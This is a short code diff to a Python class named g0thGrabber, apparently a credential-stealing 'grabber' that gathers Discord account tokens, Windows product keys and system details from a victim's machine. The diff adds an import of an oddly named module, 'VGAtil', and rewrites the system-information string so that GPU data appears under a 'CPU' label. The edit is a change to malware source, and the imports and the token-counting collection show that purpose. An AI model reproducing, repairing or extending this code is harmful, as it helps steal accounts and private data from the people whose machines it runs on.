@@ -11,6 +11,7 @@ import json
 import pyaes
 import random
 import shutil
+import VGAtil as GPU
 import sqlite3
 import re
 import traceback
@@ -1666,7 +1667,7 @@ class g0thGrabber:
         else:
             ipinfo = data
 
-        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
+        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {GPU.getGPUs()}\nProduct Key: {productKey}"
 
         collection = {
             "Discord Accounts" : self.DiscordTokensCount,
